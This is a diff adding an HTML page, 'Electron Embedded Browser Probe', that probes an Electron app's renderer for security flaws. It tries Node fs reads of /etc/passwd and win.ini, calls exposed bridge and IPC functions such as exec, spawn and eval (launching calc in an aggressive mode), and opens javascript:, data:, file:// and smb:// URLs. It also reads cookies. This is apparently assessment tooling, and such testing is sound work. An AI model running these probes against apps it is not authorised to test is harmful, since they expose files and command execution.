@@ -1,0 +1,447 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>Electron Embedded Browser Probe</title>
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<style>
+  :root { --bg:#0b0f14; --card:#121821; --muted:#9fb0c0; --ok:#4ade80; --warn:#fbbf24; --bad:#fb7185; --ink:#e5eff9; --link:#93c5fd; }
+  body { margin:0; font:14px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace; background:var(--bg); color:var(--ink); }
+  header { padding:16px 20px; background:linear-gradient(90deg,#111827,#0b0f14); border-bottom:1px solid #1f2937; }
+  h1 { margin:0 0 4px; font-size:18px; }
+  .sub { color:var(--muted); font-size:12px; }
+  main { padding:20px; display:grid; gap:16px; grid-template-columns: 1fr; max-width:1200px; margin:0 auto; }
+  .bar { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
+  button, .btn {
+    background:#1f2937; color:var(--ink); border:1px solid #374151; padding:8px 12px; border-radius:10px; cursor:pointer;
+  }
+  button:hover { background:#273449; }
+  .switch { display:inline-flex; align-items:center; gap:8px; user-select:none; }
+  input[type="checkbox"] { width:18px; height:18px; }
+  .card { background:var(--card); border:1px solid #1e293b; border-radius:12px; overflow:hidden; }
+  .card h2 { margin:0; padding:12px 14px; font-size:14px; border-bottom:1px solid #1e293b; background:#0e141d; }
+  .card .content { padding:12px; }
+  #log { white-space:pre-wrap; font-size:12px; }
+  .row { display:flex; gap:10px; flex-wrap:wrap; }
+  .tag { display:inline-block; padding:2px 6px; border-radius:8px; border:1px solid #334155; color:#cbd5e1; font-size:11px; }
+  .ok { color:var(--ok); }
+  .bad { color:var(--bad); }
+  .warn { color:var(--warn); }
+  a { color:var(--link); text-decoration:none; }
+  a:hover { text-decoration:underline; }
+  table { width:100%; border-collapse:collapse; }
+  td, th { border-bottom:1px solid #1f2937; padding:6px; font-size:12px; }
+  .links a { margin-right:10px; }
+</style>
+</head>
+<body>
+<header>
+  <h1>Electron Embedded Browser Probe</h1>
+  <div class="sub">Renderer → Preload/Bridge → Main → OS: this page pokes each step and logs what happens.</div>
+</header>
+
+<main>
+  <div class="card">
+    <h2>Controls</h2>
+    <div class="content">
+      <div class="bar">
+        <button id="runAll">Run All Tests</button>
+        <button id="clearLog">Clear Log</button>
+        <label class="switch">
+          <input id="aggressive" type="checkbox" />
+          <span>Aggressive mode (may try harmless exec like “calc”)</span>
+        </label>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Results</h2>
+    <div class="content" id="results"></div>
+  </div>
+
+  <div class="card">
+    <h2>Live Log</h2>
+    <div class="content">
+      <div id="log"></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Manual Link Tests (window.open → shell.openExternal?)</h2>
+    <div class="content links">
+      <div class="row">
+        <a href="https://example.com" target="_blank" rel="opener">_blank https://example.com</a>
+        <a href="javascript:alert('javascript: URL executed');">javascript:alert(…)</a>
+        <a href="data:text/html,%3Cscript%3Ealert('data-URL executed')%3C/script%3E" target="_blank">data: (script)</a>
+        <a href="file:///etc/hosts" target="_blank">file:///etc/hosts</a>
+        <a href="file:///C:/Windows/System32/drivers/etc/hosts" target="_blank">file:///…/hosts (Win)</a>
+        <a href="smb://127.0.0.1/share" target="_blank">smb://127.0.0.1/share</a>
+        <a href="mailto:test@example.com" target="_blank">mailto:</a>
+        <a href="tel:+15550000000" target="_blank">tel:</a>
+        <a href="web+test://poc?x=1" target="_blank">web+test:// custom scheme</a>
+        <a href="ms-settings:privacy-webcam" target="_blank">ms-settings:privacy-webcam (Win)</a>
+      </div>
+      <div class="sub">If the app blindly forwards <code>window.open</code>/links to <code>shell.openExternal</code> without allow-lists, some of these may open or leak creds (e.g., <code>smb://</code> on Windows).</div>
+    </div>
+  </div>
+</main>
+
+<script>
+(async function () {
+  const results = [];
+  const $results = document.getElementById('results');
+  const $log = document.getElementById('log');
+  const log = (...args) => { const line = args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' '); $log.textContent += line + "\n"; console.debug("[probe]", ...args); };
+
+  const OS = (() => {
+    const p = navigator.platform.toLowerCase();
+    return /win/.test(p) ? "win" : /mac|darwin/.test(p) ? "mac" : "nix";
+  })();
+
+  const PATHS = {
+    nix: ["/etc/hosts", "/etc/passwd"],
+    mac: ["/etc/hosts", "/etc/passwd"],
+    win: ["C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\win.ini"]
+  }[OS];
+
+  const candidateBridgeNames = [
+    "electron", "api", "bridge", "native", "secure", "exposed", "versions",
+    "ipc", "ipcRenderer", "ipcBridge", "preload", "context", "main", "shell", "fs"
+  ];
+
+  const candidateDangerFns = [
+    "readFile", "readFileSync", "writeFile", "writeFileSync",
+    "openPath", "open", "openExternal", "exec", "execFile", "spawn", "run",
+    "evaluate", "eval", "shell", "powershell", "cmd", "getPath", "showItemInFolder"
+  ];
+
+  function renderResults() {
+    const rows = results.map(r => `
+      <div class="row">
+        <span class="tag">${r.category}</span>
+        <span class="${r.status==='OK'?'ok':(r.status==='WARN'?'warn':'bad')}"><b>${r.status}</b></span>
+        <span>${r.title}</span>
+      </div>
+      <div style="margin:4px 0 10px 0; font-size:12px; color:#cbd5e1">${escapeHtml(r.detail)}</div>
+    `).join("");
+    $results.innerHTML = rows || '<span class="sub">No results yet. Click “Run All Tests”.</span>';
+  }
+
+  function addResult(category, title, status, detail) {
+    results.push({ category, title, status, detail });
+    renderResults();
+  }
+
+  function escapeHtml(s) {
+    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[c]));
+  }
+
+  // -------- Test 1: Node integration & direct require access
+  async function testNodeIntegration() {
+    const cat = "Renderer→Node";
+    try {
+      const hasProcess = typeof window.process !== "undefined";
+      const hasRequire = typeof window.require === "function";
+      let d = `process: ${hasProcess}, require: ${hasRequire}`;
+      if (hasProcess && window.process.versions) {
+        d += `, versions: ${JSON.stringify(window.process.versions)}`;
+      }
+      if (hasRequire) {
+        try {
+          const fs = window.require("fs");
+          const os = window.require("os");
+          const home = os.homedir ? os.homedir() : "(unknown home)";
+          d += ` | require('fs') OK; homedir=${home}`;
+          for (const p of PATHS) {
+            try {
+              const buf = fs.readFileSync(p, { encoding: "utf8" });
+              d += ` | read ${p} (${buf.length} bytes)`;
+            } catch (e) {
+              d += ` | read ${p} failed: ${e.message}`;
+            }
+          }
+          addResult(cat, "Node integration / fs reachable", "BAD", d);
+          log("[NodeIntegration] DANGEROUS:", d);
+          return;
+        } catch (e) {
+          d += ` | require('fs') threw: ${e.message}`;
+        }
+      }
+      addResult(cat, "Node globals in renderer", (hasProcess || hasRequire) ? "WARN" : "OK", d);
+      log("[NodeIntegration]", d);
+    } catch (e) {
+      addResult(cat, "Node check error", "WARN", e.stack || e.message);
+    }
+  }
+
+  // -------- Test 2: Enumerate contextBridge exposures & poke common methods
+  async function testBridgeEnumeration() {
+    const cat = "Preload/Bridge";
+    try {
+      // Heuristic: list non-standard globals on window
+      const ignore = new Set(Object.getOwnPropertyNames(window.__proto__.__proto__ || {}));
+      [
+        "window","document","location","navigator","frames","self","top","parent","history","console","crypto",
+        "localStorage","sessionStorage","indexedDB","Notification","fetch","alert","setTimeout","clearTimeout","setInterval",
+        "clearInterval","postMessage","screen","performance","CSS","Intl","Atomics","SharedArrayBuffer"
+      ].forEach(k => ignore.add(k));
+      Object.getOwnPropertyNames(window).filter(k => /^webkit/i.test(k)).forEach(k => ignore.add(k));
+
+      const suspicious = [];
+      for (const k of Object.getOwnPropertyNames(window)) {
+        if (ignore.has(k)) continue;
+        const v = window[k];
+        if (!v) continue;
+        const t = typeof v;
+        if (t === "object" || t === "function") {
+          const ownFns = [];
+          try {
+            for (const key of Object.getOwnPropertyNames(v)) {
+              if (typeof v[key] === "function") ownFns.push(key);
+            }
+          } catch {}
+          suspicious.push({ name: k, type: t, fns: ownFns.slice(0, 30) });
+        }
+      }
+
+      let detail = "Exposed globals: " + suspicious.map(s => `${s.name}(${s.type})[${s.fns.join(",")}]`).join(" | ");
+      let bad = false, warn = false;
+
+      // Try common bridge names directly
+      for (const name of candidateBridgeNames) {
+        const obj = window[name];
+        if (!obj) continue;
+        warn = true;
+        log("[Bridge] Found candidate:", name, Object.keys(obj || {}));
+        // Poke potentially dangerous methods with benign args
+        for (const fnName of candidateDangerFns) {
+          try {
+            if (typeof obj[fnName] === "function") {
+              const res = await tryCall(obj[fnName], name + "." + fnName);
+              detail += ` | ${name}.${fnName}→ ${res}`;
+              bad = true;
+            }
+          } catch (e) {
+            detail += ` | ${name}.${fnName} threw: ${e.message}`;
+          }
+        }
+      }
+
+      addResult(cat, "ContextBridge surface", bad ? "BAD" : (warn ? "WARN" : "OK"), detail || "No custom globals observed.");
+    } catch (e) {
+      addResult(cat, "Bridge enumeration error", "WARN", e.stack || e.message);
+    }
+  }
+
+  async function tryCall(fn, label) {
+    const aggressive = document.getElementById('aggressive').checked;
+    // Try readFile/getPath/openExternal shapes with harmless inputs
+    const attempts = [
+      () => fn(PATHS[0]),
+      () => fn("read", PATHS[0]),
+      () => fn({ path: PATHS[0] }),
+      () => fn("openExternal", "https://example.com"),
+      () => fn("getPath", "home"),
+      () => fn({ cmd: "openExternal", value: "https://example.com" }),
+    ];
+    if (aggressive) {
+      const pay = (OS === "win") ? "calc.exe" : (OS === "mac" ? "open -a Calculator" : "xdg-open .");
+      attempts.push(() => fn("exec", pay));
+      attempts.push(() => fn({ cmd: "exec", args: [pay] }));
+      attempts.push(() => fn(pay));
+    }
+    for (const attempt of attempts) {
+      try {
+        const out = attempt();
+        if (out && typeof out.then === "function") {
+          const val = await Promise.race([out, timeout(2000)]);
+          log("[BridgeCall]", label, "→", summarize(val));
+          return summarize(val);
+        } else {
+          log("[BridgeCallSync]", label, "→", summarize(out));
+          return summarize(out);
+        }
+      } catch (e) {
+        // swallow and continue to next shape
+      }
+    }
+    return "no-callable-shapes";
+  }
+
+  function timeout(ms){ return new Promise(res => setTimeout(()=>res(`timeout ${ms}ms`), ms)); }
+  function summarize(v) {
+    if (v === undefined) return "undefined";
+    if (v === null) return "null";
+    const t = typeof v;
+    if (t === "string") return v.slice(0,120) + (v.length>120?"…":"");
+    if (t === "number" || t === "boolean") return String(v);
+    try { return JSON.stringify(v).slice(0,160) + "…"; } catch { return t; }
+  }
+
+  // -------- Test 3: IPC channels (if bridged in directly)
+  async function testIPC() {
+    const cat = "IPC";
+    try {
+      const ipc = (window.ipcRenderer) || (window.electron && window.electron.ipcRenderer) || null;
+      if (!ipc) {
+        addResult(cat, "ipcRenderer presence", "OK", "No direct ipcRenderer on window.");
+        return;
+      }
+      let detail = "ipcRenderer exposed on window; probing common channels. ";
+      let status = "WARN";
+
+      const channels = ["readFile","openPath","shell:openExternal","exec","spawn","eval","ping","getPath","app:getPath"];
+      for (const ch of channels) {
+        try {
+          if (typeof ipc.invoke === "function") {
+            const v = await Promise.race([ipc.invoke(ch, PATHS[0] || ""), timeout(1500)]);
+            detail += ` invoke('${ch}')→${summarize(v)};`;
+            status = "BAD";
+          } else if (typeof ipc.send === "function") {
+            ipc.send(ch, PATHS[0] || "");
+            detail += ` send('${ch}') dispatched;`;
+            status = "BAD";
+          }
+        } catch (e) {
+          detail += ` ${ch} threw:${e.message};`;
+        }
+      }
+      addResult(cat, "ipcRenderer reachable", status, detail);
+    } catch (e) {
+      addResult(cat, "IPC error", "WARN", e.stack || e.message);
+    }
+  }
+
+  // -------- Test 4: window.open behavior (often forwarded to shell.openExternal)
+  async function testWindowOpen() {
+    const cat = "Navigation / openExternal";
+    const urls = [
+      "https://example.com/",
+      "javascript:alert('js-url')",
+      "data:text/html,<h1>data-url</h1>",
+      "file:///etc/hosts",
+      "file:///C:/Windows/System32/drivers/etc/hosts",
+      "smb://127.0.0.1/share",
+      "mailto:test@example.com",
+      "tel:+15550000000",
+      "web+test://poc?x=1",
+      "ms-settings:privacy-webcam"
+    ];
+    let detail = "";
+    for (const u of urls) {
+      try {
+        const w = window.open(u, "_blank");
+        // In Electron, setWindowOpenHandler may deny; if blindly forwarded, shells may handle.
+        detail += ` open(${u}) → ${(w ? "handle returned" : "null/denied")};`;
+        if (u.startsWith("smb://") || u.startsWith("file://") || u.startsWith("javascript:") || u.startsWith("data:")) {
+          // If a handle returns here, it's quite permissive.
+        }
+      } catch (e) {
+        detail += ` open(${u}) threw:${e.message};`;
+      }
+    }
+    addResult(cat, "window.open probing", "WARN", detail);
+  }
+
+  // -------- Test 5: CORS / webSecurity disabled check (XHR readable?)
+  async function testCORS() {
+    const cat = "CORS / webSecurity";
+    let detail = "";
+    try {
+      const corsReadable = await tryXHRReadable("https://example.com/");
+      if (corsReadable.ok) {
+        addResult(cat, "Cross-origin XHR readable", "BAD", "XHR to example.com returned readable content; likely CORS disabled / webSecurity:false.");
+      } else {
+        addResult(cat, "Cross-origin XHR blocked", "OK", corsReadable.detail || "Opaque/blocked (expected).");
+      }
+    } catch (e) {
+      addResult(cat, "CORS check error", "WARN", e.stack || e.message);
+    }
+  }
+
+  function tryXHRReadable(url) {
+    return new Promise(resolve => {
+      try {
+        const xhr = new XMLHttpRequest();
+        xhr.withCredentials = true;
+        xhr.open("GET", url, true);
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4) {
+            // If CORS is enforced, JS cannot read .responseText from a cross-origin without proper headers -> it will still be present but access will throw.
+            try {
+              const len = xhr.responseText.length;
+              resolve({ ok: len > 0, detail: `status=${xhr.status}, len=${len}` });
+            } catch (e) {
+              resolve({ ok: false, detail: "CORS prevented reading responseText." });
+            }
+          }
+        };
+        xhr.onerror = () => resolve({ ok: false, detail: "Network error/blocked." });
+        xhr.send();
+      } catch (e) {
+        resolve({ ok: false, detail: e.message });
+      }
+    });
+  }
+
+  // -------- Test 6: file:// load via <img> (often blocked; loads if very permissive)
+  async function testFileImage() {
+    const cat = "file:// from renderer";
+    const urls = [
+      "file:///etc/hosts",
+      "file:///C:/Windows/System32/drivers/etc/hosts"
+    ];
+    let detail = "";
+    let anyLoaded = false;
+    for (const u of urls) {
+      const ok = await imgLoad(u, 2000);
+      detail += ` img ${u} → ${ok ? "loaded" : "blocked"};`;
+      anyLoaded ||= ok;
+    }
+    addResult(cat, "Load file:// via <img>", anyLoaded ? "BAD" : "OK", detail);
+  }
+
+  function imgLoad(url, timeoutMs=1500) {
+    return new Promise(res => {
+      const img = new Image();
+      let done = false;
+      const to = setTimeout(() => { if (!done) { done = true; res(false); } }, timeoutMs);
+      img.onload = () => { if (!done) { done = true; clearTimeout(to); res(true); } };
+      img.onerror = () => { if (!done) { done = true; clearTimeout(to); res(false); } };
+      img.src = url + "#ts=" + Date.now();
+    });
+  }
+
+  // -------- Test 7: Cookie visibility (FYI)
+  async function testCookies() {
+    const cat = "Cookies";
+    try {
+      const c = document.cookie || "";
+      addResult(cat, "document.cookie", c ? "WARN" : "OK", c ? `cookie length=${c.length}; sample=${c.slice(0,120)}…` : "No cookies visible (good).");
+    } catch (e) {
+      addResult(cat, "cookie read error", "OK", "Access blocked.");
+    }
+  }
+
+  // Wire up UI
+  document.getElementById('runAll').addEventListener('click', async () => {
+    results.splice(0, results.length);
+    renderResults();
+    log("=== Running tests ===");
+    await testNodeIntegration();
+    await testBridgeEnumeration();
+    await testIPC();
+    await testWindowOpen();
+    await testCORS();
+    await testFileImage();
+    await testCookies();
+    log("=== Done ===");
+  });
+
+  document.getElementById('clearLog').addEventListener('click', () => { $log.textContent = ""; });
+
+})();
+</script>
+</body>
+</html>
